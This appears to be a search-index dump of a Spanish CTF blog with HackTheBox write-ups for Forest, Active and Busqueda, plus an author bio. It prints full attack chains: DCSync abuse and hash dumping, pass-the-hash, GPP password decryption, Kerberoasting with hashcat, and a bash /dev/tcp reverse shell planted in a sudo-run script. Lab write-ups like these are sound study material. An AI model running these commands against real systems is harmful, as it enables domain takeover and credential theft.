C:\\Users\\svc-alfresco\\Desktop\u0026gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\svc-alfresco\\Desktop\\ -OutputPrefix \u0026#34;forest\u0026#34; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/8/2025 1:47 PM 44043 forest_20250108134756_BloodHound.zip Ya hemos conseguido el control de svc-alfresco, por lo que debemos centrarnos en cómo podemos usar este usuario para elevar nuestros privilegios. A continuación, importamos el archivo zip a BloodHound y echemos un vistazo.\nComo podemos ver, este usuario es miembro de Account Operators, un grupo bastante poderoso. Microsoft dice lo siguiente:\nEl grupo Account Operators otorga privilegios limitados de creación de cuentas a un usuario. Los miembros de este grupo pueden crear y modificar la mayoría de los tipos de cuentas, incluidas las cuentas de usuarios, grupos locales y grupos globales. Los miembros del grupo pueden iniciar sesión localmente en los controladores de dominio.\nLos miembros del grupo Operadores de cuenta no pueden administrar la cuenta de usuario Administrador, las cuentas de usuario de los administradores ni los grupos Administradores, Operadores de servidor, Operadores de cuenta, Operadores de copia de seguridad u Operadores de impresión. Los miembros de este grupo no pueden modificar los derechos de usuario.\nProbemos la consulta Rutas más cortas a los administradores de dominio:\nVemos lo siguiente:\nComo somos miembros del grupo Account Operators, podemos crear un usuario en el grupo Exchange Windows Permissions para abusar del permiso WriteDacl que tiene este grupo sobre todo el dominio.\nCon WriteDacl podemos hacer ataques como DCSync. Vamos paso a paso:\nCreamos el usuario s3ntinl y lo añadimos al grupo Exchange Windows Permissions. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; net user s3ntinl s3ntinl123! /add /domain The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; net group \u0026#34;Exchange Windows Permissions\u0026#34; s3ntinl /add The command completed successfully. Otorgue privilegios DCSync a s3ntinl: Recuerde importar powerview.ps1 si aún no lo ha hecho\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;s3ntinl123!\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb.local\\s3ntinl\u0026#39;, $SecPassword) *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; import-module ./powerview.ps1 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop\u0026gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;DC=htb,DC=local\u0026#34; -PrincipalIdentity s3ntinl -Rights DCSync Abusamos del permiso DCSync con impacket-secretsdump: ┌──(s3n㉿kali)-[/opt/tools] └─$ sudo impacket-secretsdump \u0026#39;htb.local\u0026#39;/\u0026#39;s3ntinl\u0026#39;:\u0026#39;s3ntinl123!\u0026#39;@\u0026#39;10.10.10.161\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:: ... [*] Cleaning up... ¡Genial! Hemos logrado eliminar todos los hashes. Ahora podemos abusar de SMB con impacket-psexec y hacer un PassTheHash.\nEn un ataque PtH, un atacante utiliza el hash NTLM de la contraseña de un usuario para autenticarse sin conocer la contraseña real. PsExec admite esto aprovechando la capacidad de Windows para autenticarse a través de hashes NTLM al interactuar con servicios como SMB.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.10.161..... [*] Found writable share ADMIN$ ... C:\\Windows\\system32\u0026gt; whoami nt authority\\system ¡Genial! Leamos la bandera root y podremos considerar que Forest está pwned!\nC:\\Windows\\system32\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt 767c4284...1c365ef6 ","date":"11 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/forest/","section":"Posts","summary":"Forest en un controlador de dominio de Windows de dificultad fácil, para un dominio en el que se ha instalado Exchange Server. El punto de apoyo se puede obtener a través de AS-REP Roasting. Se descubre que la cuenta de servicio es miembro del grupo Operadores de cuenta, que se puede utilizar para agregar usuarios y aprovechar posteriormente los privilegios de DCSync.","title":"Forest","type":"posts"},{"content":"","date":"11 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/tags/tool/","section":"Tags","summary":"","title":"Tool","type":"tags"},{"content":"","date":"11 janeiro 2025","externalUrl":null,"permalink":"/tags/tools/","section":"Tags","summary":"","title":"Tools","type":"tags"},{"content":" Información de la máquina Plataforma HackTheBox Sistema operativo Windows Dificultad Fácil IP 10.10.10.100 Enumeración # Comencemos la enumeración con Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2025-01-04T18:48:37 |_ start_date: 2025-01-04T18:21:40 |_clock-skew: -1s Hay bastantes puertos abiertos. Podemos comenzar la enumeración comprobando si hay alguna información sobre los recursos compartidos SMB:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ smbclient -N -L \\\\10.10.10.100 Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk El recurso compartido Replicación tiene información a la que podemos acceder:\nsmb: \\\u0026gt; ls active.htb D 0 Sat Jul 21 00:37:44 2018 Recopilación de credenciales # Descubrimos una contraseña en Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ cat Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; El archivo Groups.xml se crea automáticamente en el recurso compartido SYSVOL cuando se crea una Preferencia de directiva de grupo. El archivo contiene información relacionada con los grupos, incluso contraseñas. Estas están cifradas con una clave privada de Microsoft, pero se publicó por accidente.\nEsto es bastante antiguo (de alrededor de 2014), pero es un gran conocimiento, ya que si un sistema contiene archivos antiguos que contienen una contraseña cifrada a partir de una Preferencia de directiva de grupo, se puede descifrar con la herramienta gpp-decrypt.\n┌──(s3n㉿kali)-[~] └─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 Después de encontrar la contraseña para el usuario SVC_TGS, deberíamos echar un vistazo a los recursos compartidos a los que no pudimos acceder, como Usuarios, para verificar si obtuvimos algún privilegio sobre ellos.\n┌──(s3n㉿kali)-[~] └─$ smbclient \\\\\\\\10.10.10.100\\\\Users -W active.htb -U SVC_TGS Password for [ACTIVE.HTB\\SVC_TGS]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sat Jul 21 04:39:20 2018 .. DR 0 Sat Jul 21 04:39:20 2018 Administrator D 0 Mon Jul 16 00:14:21 2018 All Users DHSrn 0 Mon Jul 13 19:06:44 2009 Default DHR 0 Mon Jul 13 20:38:21 2009 Default User DHSrn 0 Mon Jul 13 19:06:44 2009 desktop.ini AHS 174 Mon Jul 13 18:57:55 2009 Public DR 0 Mon Jul 13 18:57:55 2009 SVC_TGS D 0 Sat Jul 21 05:16:32 2018 Parece que funcionó. Enumeramos nuevamente pero no encontramos nada relevante.\nPodríamos reclamar la bandera de usuario en el directorio SVC_TGS/Desktop pero no lo haré, ya que no contaría en exámenes como OSCP, ya que se necesita un shell interactivo.\nCon el usuario SVC_TGS parece que no tenemos una manera de obtener un punto de apoyo en la máquina mientras intentaba usar RDP. Sin embargo, podemos continuar enumerando la red interna ya que tenemos credenciales válidas con este usuario.\nKerberoasting # Kerberoasting es una técnica de post-explotación que podemos utilizar al evaluar entornos de Active Directory (AD). El objetivo es obtener el hash de contraseña de una cuenta de servicio asociada con un Service Principal Name (SPN). Los SPN son atributos en AD que vinculan de forma única un servicio a una cuenta de usuario, lo que permite la autenticación Kerberos.\nEn este escenario, como usuarios de dominio autenticados, solicitamos un ticket de servicio Kerberos para un SPN. El controlador de dominio genera el ticket y lo cifra utilizando el hash NTLM de la contraseña de la cuenta de servicio vinculada al SPN. Luego se nos proporciona este ticket. En esta etapa, no necesitamos privilegios elevados, solo una cuenta de usuario de dominio válida para solicitar el ticket.\nUna vez que recuperamos el ticket cifrado, podemos descifrarlo sin conexión utilizando herramientas como Hashcat. Si tenemos éxito, recuperamos la contraseña de texto simple de la cuenta de servicio.\nPodemos intentar verificar los SPN de los usuarios con la herramienta GetUserSPN de Impacket:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share] └─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 09:06:40.351723 2025-01-04 08:22:56.876969 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8 ¡Genial! Ya lo tenemos. Ahora podemos intentar descifrar este hash con hashcat:\nsudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968 Encontramos la contraseña del administrador con el valor Ticketmaster1968. Podemos intentar abusar de SMB para establecer un shell con psexec:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec Administrator@10.10.10.100 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password: [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file zOdNJqkf.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service ROhE on 10.10.10.100..... [*] Starting service ROhE..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system Ahora podemos leer ambas flags!:\nC:\\\u0026gt; type C:\\Users\\SVC_TGS\\Desktop\\user.txt 40538eb1a29a0cef0b8d9a4d7a3a387f C:\\\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt b8737ca7bc28f8b9dcce856e5226956d ","date":"06 / 01 / 2025","externalUrl":null,"permalink":"/pt-pt/posts/active/","section":"Posts","summary":"Active es una máquina de dificultad fácil a media, que cuenta con dos técnicas muy comunes para obtener privilegios dentro de un entorno de Active Directory. Esta máquina nos enseña sobre las Preferencias de Directivas de Grupo (GPP) de Windows y contraseñas y cómo abusar de ellas.","title":"Active","type":"posts"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":" Información de la máquina Plataforma HackTheBox Sistema operativo Linux Dificultad Fácil IP 10.10.11.208 Enumeración # ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports ESTADO DEL PUERTO VERSIÓN DEL SERVICIO 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocolo 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: No se siguió la redirección a http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Información del servicio: Host: searcher.htb; SO: Linux; CPE: cpe:/o:linux:linux_kernel Podemos ver que la web en el puerto 80 redirige a searcher.htb. Vamos a agregarlo a /etc/hosts.\nTan pronto como aterrizamos en la página, vemos lo siguiente: Un vistazo rápido muestra la versión de la aplicación que se está ejecutando detrás de este sitio web, que es Searchor 2.4.0. Si buscamos vulnerabilidades, encontramos el siguiente exploit\nExplotación # Ejecutamos el exploit:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646 Colocamos un listener netcat para recibir la conexión:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4646 listening on [any] 4646 ... connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288 Ingresamos exitosamente a la máquina como usuario svc .\nsvc@busqueda:~$ cat usuario.txt cat usuario.txt 75a17...8bd3e Escalada de privilegios # Al revisar los archivos del sistema, encontramos un .git con credenciales en la carpeta app.\nsvc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 ... [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main El usuario es cody y la contraseña es jh1usoih2bkjaspwe92 para una aplicación en un subdominio llamado gitea. Vamos a añadirlo al /etc/hosts y echarle un vistazo.\nAquí dentro no encontramos nada interesante, salvo que podemos ver un usuario llamado administrador. Aunque podemos intentar usar SSH con el usuario svc y la contraseña de cody:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ssh svc@10.10.11.208 Contraseña de svc@10.10.11.208: Bienvenido a Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentación: https://help.ubuntu.com * Administración: https://landscape.canonical.com * Soporte: https://ubuntu.com/advantage ... Último inicio de sesión: mar abr 4 17:02:09 2023 desde 10.10.14.19 Comprobemos los privilegios de sudo que tiene este usuario:\nsvc@busqueda:/opt/scripts$ sudo -l El usuario svc puede ejecutar los siguientes comandos en busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * Este usuario tiene derecho a ejecutar ese script dentro de /opr/scripts.\nSi lo ejecutamos, podemos ver las siguientes opciones:\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Uso: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : Listar los contenedores de Docker en ejecución docker-inspect : Inspeccionar un determinado contenedor de Docker full-checkup : Ejecutar una comprobación completa del sistema Después de investigar un poco, descubrimos que la opción docker-inspect se puede usar para recuperar información de los contenedores de Docker que se están ejecutando en la máquina, antes vista con la opción docker-ps.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], Parece que encontramos más credenciales para la aplicación gitea. Intentemos iniciar sesión como administrador con estas credenciales.\n¡Genial! Ahora podemos comprobar el contenido de los scripts en la carpeta /opt.\nAl leer el script system-checkup.py notamos que el script full-checkup.sh es referenciado como si estuviera en la misma carpeta:\n... elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) ... Podemos abusar de esto creando nuestro propio script malicioso y referenciarlo, ya que lo estamos ejecutando con privilegios sudo:\nsvc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.12/4647 \u0026lt;\u0026amp;1\u0026#39; Ten en cuenta que debes otorgar privilegios de ejecución al script para que se ejecute, ya que este fue un error mío que me llevó bastante tiempo descubrir.\nAhora, configuramos un listener netcat y ejecutamos el script malicioso:\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup En el netcat recibimos el shell root:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4647 listening on [any] 4647 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020 root@busqueda:/tmp# whoami root ¡Genial! Hemos rooteado la máquina.\nroot@busqueda:~# cat /root/root.txt cat /root/root.txt ccd03ae...0e87097 ","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/posts/busqueda/","section":"Posts","summary":"Busqueda es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo \u003ccode\u003ePython\u003c/code\u003e para obtener acceso a nivel de usuario a la máquina. Para escalar privilegios a \u003ccode\u003eroot\u003c/code\u003e, descubrimos credenciales dentro de un archivo de configuración \u003ccode\u003eGit\u003c/code\u003e, lo que nos permite iniciar sesión en un servicio \u003ccode\u003eGitea\u003c/code\u003e local.","title":"Busqueda","type":"posts"},{"content":" Biografía # ¡Hola! Me llamo Marcos y soy un estudiante de Ciberseguridad de 21 años. En Internet, quizá me conozcas como S3n o S3ntinl. Actualmente estoy cursando un Máster en Ciberseguridad en Entornos de Tecnologías de la Información y preparándome para la certificación OSCP.\nPaso la mayor parte de mi tiempo programando, resolviendo CTFs o, en general, estudiando. Mi pasión está en el hacking y en encontrar formas creativas de resolver problemas.\nEste blog es mi manera de documentar mi camino mientras comparto, no solo mi progreso, sino también herramientas, técnicas y lecciones que voy aprendiendo en el proceso. Espero que se convierta en un recurso útil para otros, tanto para aquél que esté comenzando a explorar el mundo de la ciberseguridad como para aquellos más experimentado buscando nuevas perspectivas.\n¡No dudes en contactarme a través de cualquiera de mis redes si tienes preguntas o ideas!\n","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/about/","section":"S3ntinl","summary":"Una pequeña introducción sobre mi!","title":"Quién es S3ntinl?","type":"page"},{"content":"","externalUrl":null,"permalink":"/pt-pt/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/pt-pt/series/","section":"Series","summary":"","title":"Series","type":"series"}]